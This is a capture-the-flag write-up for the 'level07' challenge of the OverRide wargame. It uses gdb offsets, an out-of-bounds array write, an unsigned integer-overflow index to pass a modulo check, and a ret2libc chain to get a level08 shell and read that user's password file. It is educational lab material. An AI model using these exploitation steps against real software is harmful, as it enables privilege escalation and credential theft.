# level07

We’re given a simple program that allows us to store and read integers in a buffer.
However, the environment and program arguments are cleared upon execution, so classic shellcode injection won’t work here.

```bash
level07@OverRide:~$ ./level07
----------------------------------------------------
  Welcome to wil's crappy number storage service!
----------------------------------------------------
 Commands:
    store - store a number into the data storage
    read  - read a number from the data storage
    quit  - exit the program
----------------------------------------------------
   wil has reserved some storage :>
----------------------------------------------------

Input command:
```

The `store` command does not check whether the index is within bounds (i.e., between 0 and 99).
This means we can write to arbitrary memory locations by calculating the appropriate index.

Let’s use *gdb* to find the address of the buffer and identify an offset we can use for reference.

```bash
(gdb) b read_number
Breakpoint 1 at 0x80486dd
(gdb) r
...
Input command: read

Breakpoint 1, 0x080486dd in read_number ()
(gdb) x/x ($ebp + 8)
0xffffd520:     0xffffd544
```

Here:

- `0xffffd544` is the address of the first element of the buffer.
- `0xffffd520` is the address passed as a parameter to read_number.

Let’s calculate the offset:

```
0xffffd520 - 0xffffd544 = -0x24 (-36)
sizeof(int) == 4
-36 / 4 = -9
```

So, `buf[-9]` corresponds to the address of the first element. Let's confirm:

```bash
(gdb) c
Continuing.
 Index: -9
 Number at data[4294967287] is 4294956356
 Completed read command successfully
```

We get `4294956356`, which is `0xffffd544`.

Next, we locate the saved return address (`EIP`) of `main`:

```bash
(gdb) b main
Breakpoint 1 at 0x08048729
(gdb) c
Continuing.
Input command: read

Breakpoint 1, 0x0804892b in main ()
(gdb) i f
Stack level 0, frame at 0xffffd710:
 eip = 0x804892b in main; saved eip 0xf7e45513
 Arglist at 0xffffd708, args:
 Locals at 0xffffd708, Previous frame's sp is 0xffffd710
 Saved registers:
  ebx at 0xffffd6fc, ebp at 0xffffd708, esi at 0xffffd700, edi at 0xffffd704, eip at 0xffffd70c
```

Let’s compute the index in the buffer for this address:

```
0xffffd70c - 0xffffd544 = 1c8 (456)
456 / 4 = 114
```

Let's check :

```bash
(gdb) c
Continuing.
 Index: 114
 Number at data[114] is 4158936339
 Completed read command successfully
(gdb) x/x 0xffffd70c
0xffffd70c:     0xf7e45513
```

Since `4158936339 == 0xf7e45513`, we can overwrite the return address using index 114.

The program prevents writing to any index where `index % 3 == 0`.
Since `114 % 3 == 0`, we cannot write to it directly.
We can bypass this using integer overflow. By wrapping around the array using an unsigned integer overflow:

```
(2^32 / 4) + 114 = 1073741938
1073741938 % 3 = 1
```

Now we can target index 114 indirectly via this large value.

Let's get all the classic informations for a ret2libc:

```bash
(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>

(gdb) p exit
$2 = {<text variable, no debug info>} 0xf7e5eb70 <exit>

(gdb) find __libc_start_main,+99999999,"/bin/sh"
0xf7f897ec
warning: Unable to access target memory at 0xf7fd3b74, halting search.
1 pattern found.
```

Converting to decimal:

```
system = 4159090384
exit = 4159040368
/bin/sh = 4160264172
```

Let’s run the exploit:

```bash
level07@OverRide:~$ ./level07
...
Input command: store
 Number: 4159090384
 Index: 1073741938
 Completed store command successfully
Input command: store
 Number: 4159040368
 Index: 115
 Completed store command successfully
Input command: store
 Number: 4160264172
 Index: 116
 Completed store command successfully
Input command: quit
$ whoami
level08
$ cat /home/users/level08/.pass
<flag>
```
